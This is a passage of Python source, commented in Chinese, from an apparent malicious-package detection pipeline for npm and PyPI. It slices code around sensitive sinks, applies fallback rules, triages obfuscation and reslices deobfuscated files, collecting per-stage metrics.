    silenced_slices: List[FunctionSlice],
    entry_kind_map: Dict[str, str],
    package: str,
) -> List[FunctionSlice]:
    added: List[FunctionSlice] = []
    files_with_silent: Set[str] = {s.file for s in silenced_slices}
    seen_keys: Set[Tuple[str, str]] = set()

    for file_rel in files_with_silent:
        entry = entry_kind_map.get(file_rel, "unknown")
        if ENTRY_LEVEL.get(entry, 9) > 2:
            continue
        if (file_rel, "__toplevel__") in seen_keys:
            continue
        seen_keys.add((file_rel, "__toplevel__"))

        abs_path = os.path.join(extract_dir, file_rel)
        source = safe_read_text(abs_path)
        if source is None:
            continue
        src, (start, end) = line_window(source, 1, half=60)
        lang = detect_language(file_rel)
        ecosystem = "npm" if lang == "js" else "pypi"
        sinks_list = ["__dyn_fallback__"]
        sid = compute_slice_id(package, file_rel, "__toplevel__", sinks_list, 0)
        fs = FunctionSlice(
            slice_id=sid,
            package=package,
            ecosystem=ecosystem,
            file=file_rel,
            entry_kind=entry,
            sink=sinks_list,
            sink_kind="dynamic",
            func_name="__toplevel__",
            func_range=(start, end),
            source_code=src,
            callees_inline=[],
            imports=[],
            reslice_version=0,
            parent_slice_id=None,
            was_obfuscated=False,
            deob_tool=None,
            confidence_hint={
                "dynamic_probe_fallback": True,
                "fallback_rule": "G",
            },
        )
        added.append(fs)
    return added


# ----------------------------------------------------------------------
# §7 兜底 A：高危入口（entry_lv ≤ 2）无 Sink 命中 -> 强制出 __toplevel__ 伪函数
# ----------------------------------------------------------------------

def _fallback_A_high_risk_entry_no_hit(
    extract_dir: str,
    keep_files: List[str],
    entry_kind_map: Dict[str, str],
    pass1_slices: List[FunctionSlice],
    package: str,
) -> List[FunctionSlice]:
    covered_files: Set[str] = {s.file for s in pass1_slices}
    added: List[FunctionSlice] = []
    for rel in keep_files:
        lang = detect_language(rel)
        if lang not in ("js", "py"):
            continue
        entry = entry_kind_map.get(rel, "unknown")
        if ENTRY_LEVEL.get(entry, 9) > 2:
            continue
        if rel in covered_files:
            continue
        abs_path = os.path.join(extract_dir, rel)
        source = safe_read_text(abs_path)
        if source is None:
            continue
        # 取文件首 ±60 行（center=1）
        src, (start, end) = line_window(source, 1, half=60)
        if not src.strip():
            continue
        ecosystem = "npm" if lang == "js" else "pypi"
        sinks_list = ["__no_sink__"]
        sid = compute_slice_id(package, rel, "__toplevel__", sinks_list, 0)
        fs = FunctionSlice(
            slice_id=sid,
            package=package,
            ecosystem=ecosystem,
            file=rel,
            entry_kind=entry,
            sink=sinks_list,
            sink_kind="static",
            func_name="__toplevel__",
            func_range=(start, end),
            source_code=src,
            callees_inline=[],
            imports=[],
            reslice_version=0,
            parent_slice_id=None,
            was_obfuscated=False,
            deob_tool=None,
            confidence_hint={
                "fallback_rule": "A",
                "no_sink_hit_but_high_risk_entry": True,
            },
        )
        added.append(fs)
    return added


# ----------------------------------------------------------------------
# §7 兜底 F：mixed_heavy + 反混淆失败 -> __wholefile__ 伪函数
# ----------------------------------------------------------------------

def _fallback_F_wholefile(
    extract_dir: str,
    file_rel: str,
    package: str,
    ecosystem: str,
    entry_kind: str,
    original_source: str,
) -> FunctionSlice:
    lines = original_source.splitlines()
    head = "\n".join(lines[:200])
    sid = compute_slice_id(package, file_rel, "__wholefile__", ["__raw_payload__"], 1)
    return FunctionSlice(
        slice_id=sid,
        package=package,
        ecosystem=ecosystem,
        file=file_rel,
        entry_kind=entry_kind,
        sink=["__raw_payload__"],
        sink_kind="static",
        func_name="__wholefile__",
        func_range=(1, min(200, len(lines))),
        source_code=head,
        callees_inline=[],
        imports=[],
        reslice_version=1,
        parent_slice_id=None,
        was_obfuscated=True,
        deob_tool="failed",
        confidence_hint={
            "fallback_rule": "F",
            "raw_payload": True,
            "heavily_obfuscated": True,
        },
    )


# ----------------------------------------------------------------------
# §4.7.x pass2：对 Deobfuscator 产物复用 pass1 Slicer
# ----------------------------------------------------------------------

def _slice_file_pass2(
    extract_dir: str,
    deob_rel: str,
    original_rel: str,
    package: str,
    ecosystem: str,
    entry_kind: str,
    npm_sinks: Set[str],
    pass1_slices_of_file: List[FunctionSlice],
    deob_tool: str,
) -> List[FunctionSlice]:
    """在反混淆产物上切片，打 reslice_version=1，parent_slice_id 指回 pass1。"""
    abs_path = os.path.join(extract_dir, deob_rel)
    source = safe_read_text(abs_path)
    if source is None:
        return []

    # 构建 parent key 索引：(original_file, func_name, sink_joined) -> slice_id
    parent_map: Dict[Tuple[str, str, str], str] = {}
    for s in pass1_slices_of_file:
        parent_map[(s.file, s.func_name, "|".join(s.sink))] = s.slice_id

    lang = detect_language(deob_rel)
    if lang == "py":
        slices = slice_python_file(
            source=source, file_rel=deob_rel, package=package,
            entry_kind=entry_kind, reslice_version=1,
            parent_slices_by_key=parent_map,
            was_obfuscated=True, deob_tool=deob_tool,
        )
    elif lang == "js":
        slices = slice_js_file(
            source=source, file_rel=deob_rel, package=package,
            entry_kind=entry_kind, sinks=npm_sinks, reslice_version=1,
            parent_slices_by_key=parent_map,
            was_obfuscated=True, deob_tool=deob_tool,
        )
    else:
        return []

    # §7 兜底 E：pass2 切出 < 3 非空行 或 空 -> 回退
    if not slices:
        return []
    # 过滤掉实在太短的（Slicer 内部已做过扩窗，但若仍为空，本处标记 reslice_failed 让后续回落）
    return slices


# ----------------------------------------------------------------------
# 包级主流程
# ----------------------------------------------------------------------

# ======================================================================
# 第一部分：pass1_only（首次切片，用于 Phase 1）
# ======================================================================

def pass1_only(
    tarball: str,
    ecosystem: str,
    workdir: str,
    package_name: Optional[str] = None,
    sensitive_csv: str = "",
) -> Pass1Artifact:
    """只做 Unpack → Filter → Locate → Slicer pass1 + 兜底 A + FP 缓释 + 兜底 G。

    Phase 1 的唯一入口。输出 `Pass1Artifact`，其中 `PackageResult` 已填好
    各阶段耗时（elapsed_ms_*），供后续统计模块聚合。
    """
    t_total_0 = time.perf_counter()

    # ---- Unpack ----
    t = time.perf_counter()
    if os.path.isdir(tarball):
        pkg = package_name or os.path.basename(tarball)
        result = PackageResult(
            package=pkg, ecosystem=ecosystem,
            tarball=tarball, extract_dir=tarball,
        )
    else:
        unpack: UnpackResult = unpack_tarball(tarball, ecosystem, workdir, package_name)
        result = PackageResult(
            package=unpack.package,
            ecosystem=ecosystem,
            tarball=tarball,
            extract_dir=unpack.extract_dir,
            errors=list(unpack.errors),
        )
        if unpack.errors and not os.path.isdir(unpack.extract_dir):
            result.elapsed_ms_unpack = (time.perf_counter() - t) * 1000
            result.elapsed_ms_total = (time.perf_counter() - t_total_0) * 1000
            return Pass1Artifact(
                result=result, pass1_slices=[], silenced_slices=[],
                keep_files=[], entry_map={}, extract_dir=result.extract_dir,
                ecosystem=ecosystem, package=result.package, npm_sinks=set(),
            )
    result.elapsed_ms_unpack = (time.perf_counter() - t) * 1000

    extract_dir = result.extract_dir
    pkg_name = result.package

    # ---- Filter ----
    t = time.perf_counter()
    keep, dropped = filter_files(extract_dir, ecosystem)
    result.elapsed_ms_filter = (time.perf_counter() - t) * 1000

    # 安全阀：超大包只保留最高危的 200 个文件
    MAX_KEEP_FILES = 200
    if len(keep) > MAX_KEEP_FILES:
        t = time.perf_counter()
        entry_map_full = locate_entries(extract_dir, keep, ecosystem)
        keep.sort(key=lambda r: ENTRY_LEVEL.get(entry_map_full.get(r, "unknown"), 9))
        keep = keep[:MAX_KEEP_FILES]
        entry_map = {r: entry_map_full[r] for r in keep if r in entry_map_full}
        result.elapsed_ms_locate = (time.perf_counter() - t) * 1000
    else:
        t = time.perf_counter()
        entry_map = locate_entries(extract_dir, keep, ecosystem)
        result.elapsed_ms_locate = (time.perf_counter() - t) * 1000

    result.keep_count = len(keep)
    result.dropped_count = len(dropped)

    npm_sinks = load_npm_sinks(sensitive_csv) if ecosystem == "npm" else set()

    # ---- Slicer pass1 ----
    t = time.perf_counter()
    pass1_all: List[FunctionSlice] = []
    for rel in keep:
        lang = detect_language(rel)
        if lang not in ("js", "py"):
            continue
        try:
            ss = _slice_file_pass1(
                extract_dir=extract_dir,
                file_rel=rel,
                package=pkg_name,
                ecosystem=ecosystem,
                entry_kind=entry_map.get(rel, "unknown"),
                npm_sinks=npm_sinks,
            )
            pass1_all.extend(ss)
        except Exception as e:
            result.errors.append(f"slice_pass1_failed:{rel}:{e}")

    # NPM 专项：
    #   1) 从 package.json.scripts 合成 __npm_scripts__ 伪切片（lifecycle 钩子 payload）
    #   2) 包名 typosquat 检测（合成 __package_name_check__）
    if ecosystem == "npm":
        pass1_all.extend(
            _synthesize_npm_lifecycle_slices(extract_dir, pkg_name)
        )
        pass1_all.extend(
            _synthesize_npm_package_name_check(pkg_name)
        )

    # 兜底 A：高危入口无命中 -> 强制 __toplevel__
    pass1_all.extend(
        _fallback_A_high_risk_entry_no_hit(
            extract_dir, keep, entry_map, pass1_all, pkg_name
        )
    )

    # Step 1：同 (file, entry_kind) 下平凡切片过多时合并成 __file_digest__
    # 节省 token + 让 LLM 看到文件级视角
    pass1_all = _merge_same_file_slices(pass1_all)

    # Step 1.5（v2 改进 ⑤）：跨文件 trivial 切片合并
    # 大型 SDK 风格的包（如 python-aliyun-sdk-rds）会在 100+ 个文件里写完全
    # 一致的 setattr 模板。Step 1 是按文件分组，每文件 1 条达不到阈值，
    # 这里按"源码签名"跨文件合并，避免 triage/judge 阶段的长尾。
    pass1_all = _merge_similar_trivial_across_files(pass1_all)

    # FP 缓释 + 兜底 G
    active_slices, silenced_slices = apply_dynamic_probe_silencing(pass1_all, entry_map)
    active_slices.extend(
        _fallback_G_build_toplevel_for_silent_files(
            extract_dir, silenced_slices, entry_map, pkg_name
        )
    )
    result.elapsed_ms_slice_pass1 = (time.perf_counter() - t) * 1000

    result.pass1_count = len(active_slices)
    result.dyn_archive_count = len(silenced_slices)
    result.elapsed_ms_total = (time.perf_counter() - t_total_0) * 1000

    return Pass1Artifact(
        result=result,
        pass1_slices=active_slices,
        silenced_slices=silenced_slices,
        keep_files=keep,
        entry_map=entry_map,
        extract_dir=extract_dir,
        ecosystem=ecosystem,
        package=pkg_name,
        npm_sinks=npm_sinks,
    )


# ======================================================================
# 第二部分：pass2_flow（Triage + Deob + Pass2，用于 Phase 2）
# ======================================================================

@dataclass
class Pass2Metrics:
    """Phase 2 指标汇总（单个包）。"""
    package: str
    triage_total: int = 0
    triage_heuristic_skip: int = 0        # 启发式直接判 none
    triage_sent_to_llm: int = 0           # 本应送 LLM 的切片数（本实现用指纹替代）
    triage_json_error: int = 0            # LLM 返回 JSON 解析错误数（预留）
    triage_tokens_total: int = 0          # LLM token 消耗（预留）
    triage_elapsed_ms: float = 0.0        # Triage 总耗时
    obf_class_counts: Dict[str, int] = field(default_factory=dict)

    deob_attempted: int = 0
    deob_success: int = 0
    deob_failed: int = 0
    deob_tool_counts: Dict[str, int] = field(default_factory=dict)
    deob_elapsed_ms: float = 0.0
    deob_entropy_delta: List[float] = field(default_factory=list)    # 每个成功反混淆文件：old - new 熵差
    deob_loc_delta: List[int] = field(default_factory=list)          # 每个成功反混淆文件：new_loc - old_loc

    pass2_elapsed_ms: float = 0.0
    pass2_slice_count: int = 0
    pass2_new_slice_count: int = 0        # pass2 中 parent_slice_id is None 的新增切片
    reslice_failed_count: int = 0


def pass2_flow(
    artifact: Pass1Artifact,
    triage_fn=None,
    deob_fn=None,
) -> Tuple[List[FunctionSlice], Pass2Metrics]:
    """基于 Phase 1 产物执行 Triage → Deob → Pass2，并采集指标。

    triage_fn / deob_fn 可注入自定义实现（用于 LLM 驱动）；默认用内置
    启发式+指纹 triage 和 AST-based deob，以保证链路可跑通。
    """
    if triage_fn is None:
        triage_fn = _default_triage_fn
    if deob_fn is None:
        deob_fn = _default_deob_fn

    active_slices = list(artifact.pass1_slices)
    result = artifact.result
    extract_dir = artifact.extract_dir
    pkg_name = artifact.package
    ecosystem = artifact.ecosystem
    entry_map = artifact.entry_map
    npm_sinks = artifact.npm_sinks

    metrics = Pass2Metrics(package=pkg_name)

    # ---- Triage ----
    t = time.perf_counter()
    metrics.triage_total = len(active_slices)
    for s in active_slices:
        triage_info = triage_fn(s)
        # triage_info 约定：dict with keys {obf_class, confidence, target_file_needed,
        #   triage_source, reason, hints, tokens?, json_error?}
        s.obf_class = triage_info.get("obf_class", "none")
        s.obf_triage_confidence = triage_info.get("confidence", 1.0)
        s.triage_source = triage_info.get("triage_source", "heuristic_skip")
        s.confidence_hint.update(triage_info.get("hints", {}))
        s.confidence_hint["triage_reason"] = triage_info.get("reason", "")
        s.confidence_hint["target_file_needed"] = triage_info.get("target_file_needed", False)

        if s.triage_source == "heuristic_skip":
            metrics.triage_heuristic_skip += 1
        else:
            metrics.triage_sent_to_llm += 1
        metrics.triage_tokens_total += int(triage_info.get("tokens", 0) or 0)
        if triage_info.get("json_error"):
            metrics.triage_json_error += 1
        metrics.obf_class_counts[s.obf_class] = metrics.obf_class_counts.get(s.obf_class, 0) + 1
    metrics.triage_elapsed_ms = (time.perf_counter() - t) * 1000
    result.elapsed_ms_triage = metrics.triage_elapsed_ms

    # ---- Deobfuscator（按 §4.5 路由） ----
    t = time.perf_counter()
    deob_targets: Dict[str, str] = {}
    for s in active_slices:
        if s.obf_class == "none":
            continue
        prev = deob_targets.get(s.file)
        if prev is None or _obf_priority(s.obf_class) > _obf_priority(prev):
            deob_targets[s.file] = s.obf_class

    deob_map: Dict[str, DeobResult] = {}
    for file_rel, obf_class in deob_targets.items():
        abs_path = os.path.join(extract_dir, file_rel)
        source = safe_read_text(abs_path)
        if source is None:
            continue
        metrics.deob_attempted += 1
        try:
            dr, before_stats, after_stats = deob_fn(
                extract_dir=extract_dir,
                file_rel=file_rel,
                ecosystem=ecosystem,
                obf_class=obf_class,
                source=source,
            )
        except Exception as e:
            dr = DeobResult(False, "failed", None, f"exception:{e}")
            before_stats, after_stats = None, None
        deob_map[file_rel] = dr
        key = dr.tool if dr.success else "failed"
        metrics.deob_tool_counts[key] = metrics.deob_tool_counts.get(key, 0) + 1
        if dr.success:
            metrics.deob_success += 1
            if before_stats and after_stats:
                metrics.deob_entropy_delta.append(before_stats["entropy"] - after_stats["entropy"])
                metrics.deob_loc_delta.append(after_stats["loc"] - before_stats["loc"])
        else:
            metrics.deob_failed += 1
    result.deob_summary = metrics.deob_tool_counts
    metrics.deob_elapsed_ms = (time.perf_counter() - t) * 1000
    result.elapsed_ms_deob = metrics.deob_elapsed_ms

    # ---- Slicer pass2 ----
    t = time.perf_counter()
    pass2_all: List[FunctionSlice] = []
    for file_rel, dr in deob_map.items():
        if not dr.success or not dr.output_rel:
            obf_class = deob_targets[file_rel]
            if obf_class == "mixed_heavy":
                src = safe_read_text(os.path.join(extract_dir, file_rel)) or ""
                entry_kind = entry_map.get(file_rel, "unknown")
                pass2_all.append(
                    _fallback_F_wholefile(
                        extract_dir, file_rel, pkg_name, ecosystem,
                        entry_kind, src,
                    )
                )
            for s in active_slices:
                if s.file == file_rel and s.obf_class != "none":
                    s.confidence_hint["reslice_failed"] = True
                    s.was_obfuscated = True
                    s.deob_tool = "failed"
                    metrics.reslice_failed_count += 1
            continue

        pass1_file_slices = [s for s in active_slices if s.file == file_rel]
        p2 = _slice_file_pass2(
            extract_dir=extract_dir,
            deob_rel=dr.output_rel,
            original_rel=file_rel,
            package=pkg_name,
            ecosystem=ecosystem,
            entry_kind=entry_map.get(file_rel, "unknown"),
            npm_sinks=npm_sinks,
            pass1_slices_of_file=pass1_file_slices,
            deob_tool=dr.tool,
        )
        if not p2:
            for s in pass1_file_slices:
                s.confidence_hint["reslice_failed"] = True
                s.was_obfuscated = True
                s.deob_tool = dr.tool
                metrics.reslice_failed_count += 1
        else:
            for s in pass1_file_slices:
                s.was_obfuscated = True
                s.deob_tool = dr.tool
            pass2_all.extend(p2)

    metrics.pass2_slice_count = len(pass2_all)
    metrics.pass2_new_slice_count = sum(1 for s in pass2_all if s.parent_slice_id is None)
    metrics.pass2_elapsed_ms = (time.perf_counter() - t) * 1000
    result.elapsed_ms_slice_pass2 = metrics.pass2_elapsed_ms
    result.pass2_count = len(pass2_all)
    result.elapsed_ms_total += (
        metrics.triage_elapsed_ms + metrics.deob_elapsed_ms + metrics.pass2_elapsed_ms
    )
    return pass2_all, metrics


# ----- 内置默认 Triage / Deob 实现（LLM 未启用时保证链路可跑）-----

def _default_triage_fn(slice_obj: FunctionSlice) -> Dict:
    res = triage_slice(slice_obj)
    return {
        "obf_class": res.obf_class,
        "confidence": res.confidence,
        "target_file_needed": res.target_file_needed,
        "triage_source": res.triage_source,
        "reason": res.reason,
        "hints": res.hints,
        "tokens": 0,
        "json_error": False,
    }


def _default_deob_fn(extract_dir, file_rel, ecosystem, obf_class, source):
    from .utils import shannon_entropy
    before = {
        "entropy": shannon_entropy(source),
        "loc": len(source.splitlines()),
    }
    dr = deobfuscate_file(extract_dir, file_rel, ecosystem, obf_class, source)
    if dr.success and dr.output_rel:
        new_src = safe_read_text(os.path.join(extract_dir, dr.output_rel)) or ""
        after = {
            "entropy": shannon_entropy(new_src),
            "loc": len(new_src.splitlines()),
        }
    else:
        after = None
    return dr, before, after


# ======================================================================
# 向后兼容：旧 CLI 使用的组合入口
# ======================================================================

def process_package(
    tarball: str,
    ecosystem: str,
    workdir: str,
    package_name: Optional[str] = None,
    sensitive_csv: str = "",
) -> Tuple[PackageResult, List[FunctionSlice], List[FunctionSlice], List[FunctionSlice]]:
    """向后兼容旧 `run.py slice-package`/`run.py run`。内部 = pass1_only + pass2_flow。"""
    artifact = pass1_only(tarball, ecosystem, workdir, package_name, sensitive_csv)
    pass2_slices, _metrics = pass2_flow(artifact)
    return artifact.result, artifact.pass1_slices, pass2_slices, artifact.silenced_slices


def _obf_priority(obf_class: str) -> int:
    order = [
        "none", "eval_string", "b64_chain", "hex_chain", "zlib_chain",
        "aaencode", "jsfuck", "pyc_marshal", "pyarmor",
        "jsobf_stringarray", "webpack_bundle", "mixed_heavy",
    ]
    try:
        return order.index(obf_class)
    except ValueError:
        return -1
